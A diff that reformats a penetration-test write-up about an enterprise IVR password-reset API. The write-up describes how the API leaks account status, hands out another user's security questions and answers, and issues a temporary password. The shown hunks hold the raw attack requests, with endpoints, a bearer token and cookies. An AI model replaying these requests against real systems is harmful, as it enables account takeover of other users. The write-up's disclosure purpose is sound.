@@ -31,9 +31,9 @@ During network penetration testing, I discovered an application that allows an e
 
 While processing the password reset request, the application checks whether the user account is locked or unlocked. If the account is unlocked, it returns a response of “true”; otherwise, it returns “false.”
 
-```
-Request
+**Request**
 
+```
 GET /enterprise/ivr/password/reset/mainframe/unlock/****985 HTTP/1.1 
 Authorization: Bearer GNK90pBIAzYbSze9GcgNzIfo 
 Content—Type: application/json 
@@ -47,9 +47,9 @@ Cookie: RANDOM_ID=b1df32eg1bég43bba58ae1303209784b
 
 ```
 
-```
-Response
+**Response**
 
+```
 HTTP/1.1 200 0K 
 Date: Fri, 09 Jun 2022 07:56:15 GMT 
 Content—Type: application/json 
@@ -72,9 +72,9 @@ After validating this user ID, I received the same response as before: "userIdUn
 
 The next step is to determine the security questions and answers that user ID ****079 had set during registration. To achieve this, I used the following request.
 
-```
-Request
+**Request**
 
+```
 GET /enterprise/ivr/password/reset/pwid/****079 HTTP/1.1 
 Authorization: Bearer GNK90pBIAzYbSze9GcgNzIfo
 Content—Type: application/json 
@@ -88,9 +88,9 @@ Cookie: RANDOM_ID=b1df32eg1bég43bba58ae1303209784b
 
 ```
 
-```
-Response
+**Response**
 
+```
 HTTP/1.1 200 0K 
 Date: Fri, 09 Jun 2022 08:58:10 GMT 
 Content—Type: application/json 
@@ -129,9 +129,9 @@ I successfully retrieved the security questions and answers for user ID ****079.
 
 After submitting the correct answer to the question, I sent the following request, and the application responded with a temporary password.
 
-```
-Request
+**Request**
 
+```
 GET /enterprise/ivr/password/reset/mainframe/reset/****079 HTTP/1.1 
 Authorization: Bearer GNK90pBIAzYbSze9GcgNzIfo 
 Content—Type: application/json 
@@ -145,9 +145,9 @@ Cookie: RANDOM_ID=b1df32eg1beg43bba58ae1303209784b
 
 ```
 
-```
-Response
+**Response**
 
+```
 HTTP/1.1 200 0K 
 Date: 09 Jun 2022 08:58:47 GMT  
 Content—Type: application/json 
